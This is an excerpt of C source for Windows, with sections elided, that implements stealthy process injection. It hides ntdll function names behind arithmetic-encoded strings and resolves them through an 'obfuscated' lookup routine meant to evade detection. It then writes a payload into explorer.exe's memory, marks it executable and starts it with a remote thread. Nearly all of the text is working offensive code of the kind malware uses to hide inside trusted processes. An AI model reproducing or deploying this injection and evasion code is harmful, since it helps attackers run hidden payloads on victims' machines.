...
char g_ntoproc[] = {((381+9)/5), ((247-15)/2), ((171-13)/2), ((574-14)/5), ((188/2)+7), ((5390/7)/7), ((84+3)-7), ((119-4)-1), ((135-14)-10), ((1188/3)/4), ((81+15)+5), ((1277-12)/11), ((88+11)+16), 0};
#ifndef _WIN64
...
typedef NTSTATUS(NTAPI* fn_NtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID);
...
FARPROC StealthGetProcAddress(HMODULE hModule, LPCSTR lpProcName) { //Stealth dyn func address enum using obf debug registers and runtime key encryption
	...
	else if (strcmp(lpProcName, g_ntoproc) == 0) {
    typedef NTSTATUS(NTAPI* fn_Test)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID);
    fn_Test testCall = (fn_Test)actualAddr;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = {0};
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    CLIENT_ID cid = {0};
    testCall(&hProcess, PROCESS_QUERY_INFORMATION, &objAttr, &cid);
}
    RemoveVectoredExceptionHandler(handler);
...
bool InjBytes(DWORD pid, fn_NtAVM NtAllocVirtMem, 
   fn_NtWVM NtWriteVirtMem, fn_NtPVM NtProtectVirtMem,
   fn_RTLCUT RtlCreateThread, fn_NtOpenProcess NtOpenProc) {
   ...
   NTSTATUS status = NtOpenProc(&hProcess, 
   ...
   PVOID baseAddr = NULL;
   SIZE_T regionSize = 0x1000;
   status = NtAllocVirtMem(hProcess, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   ...
   status = NtWriteVirtMem(hProcess, baseAddr, payload, payloadSize, &bytesWritten);
   if (!NT_SUCCESS(status) || bytesWritten != payloadSize) {
       CloseHandle(hProcess);
       return false;
   }

   ULONG oldProtect;
   status = NtProtectVirtMem(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
   if (!NT_SUCCESS(status)) {
       CloseHandle(hProcess);
       return false;
   }
   ...
   HANDLE hNewThread;
   status = RtlCreateThread(hProcess, NULL, FALSE, 0, NULL, NULL, baseAddr, NULL, &hNewThread, NULL);
   if (!NT_SUCCESS(status)) {
       CloseHandle(hProcess);
       return false;
   }

   Sleep(100); // Wait for thread exec

   status = NtProtectVirtMem(hProcess, &baseAddr, &regionSize, PAGE_READONLY, &oldProtect);
   if (!NT_SUCCESS(status)) {
...
int main() {
    ...
    if (!addr_NtAllocateVirtualMemory) {
        return 1;
    }
    ...
    if (!addr_NtProtectVirtualMemory) {
        return 1;
    }
    ...
    if (!addr_RtlCreateUserThread) {
        return 1;
    }
    fn_RTLCUT RtlCreateUserThreadFunc = (fn_RTLCUT)addr_RtlCreateUserThread;
    FARPROC addr_NtOpenProcess = StealthGetProcAddress(hNtdll, g_ntoproc);
    if (!addr_NtOpenProcess) {
        return 1;
    }
    fn_NtOpenProcess NtOpenProcessFunc = (fn_NtOpenProcess)addr_NtOpenProcess;
    DWORD explorerPID = FindExplorerPID();
    if (!explorerPID) {
        return 1;
    }
    bool result = InjBytes(explorerPID, NtAllocateVirtualMemoryFunc, NtWriteVirtualMemoryFunc, 
        NtProtectVirtualMemoryFunc, RtlCreateUserThreadFunc, NtOpenProcessFunc);
    return result ? 0 : 1;
}
